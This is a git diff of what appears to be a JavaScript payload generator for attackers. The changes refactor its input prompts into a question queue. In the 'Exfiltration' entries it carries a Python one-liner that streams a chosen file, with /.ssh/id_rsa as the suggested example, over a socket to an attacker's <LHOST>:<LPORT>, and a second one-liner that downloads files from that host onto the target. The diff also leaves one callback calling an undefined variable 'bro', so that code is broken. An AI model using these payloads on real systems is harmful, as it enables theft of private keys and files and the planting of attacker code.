@@ -9,6 +9,11 @@ var Load = function(obj){
 	arrayMisc.push(obj)
 }
 
+var questions = [];
+var question = function(val){
+	questions.push(val);
+}
+
 /* 
 ###########################################
 ############### Payloads ##################
@@ -81,8 +86,10 @@ Load({
 	title: "Send File via Socket Connection",
 	payload:'python -c \'exec """\nimport socket;import sys;s = socket.socket();s.connect(("<LHOST>",<LPORT>));f=open ("<PROMPT>", "rb");l = f.read(1024)\nwhile (l):\n    s.send(l)\n    l = f.read(1024)\ns.close();"""\'',
 	category: "Exfiltration",
-	callback: function(returnToPrepare){
-		ncat.Init(returnToPrepare, "Which file would you like to exfiltrate? (ex: /.ssh/id_rsa)", "file")
+	callback: function(bro){
+		question("Which file would you like to exfiltrate? (ex: /.ssh/id_rsa)");
+		question(ask.ncat);
+		ask.some(questions, bro);
 	}
 })
 
@@ -91,7 +98,8 @@ Load({
 	payload:'python -c \'import urllib;urllib.urlretrieve ("http://<LHOST>:<LPORT>/<PROMPT>","<PATH>");\'',
 	category: "Exfiltration",
 	callback: function(returnToPrepare, lhost, lport, rhost, rport, user, path){
-		question.ask("What file would you like to download? (ex: script.sh)", returnToPrepare)
+		question("What file would you like to download? (ex: script.sh)");
+		ask.some(questions, bro);
 	}
 })
 
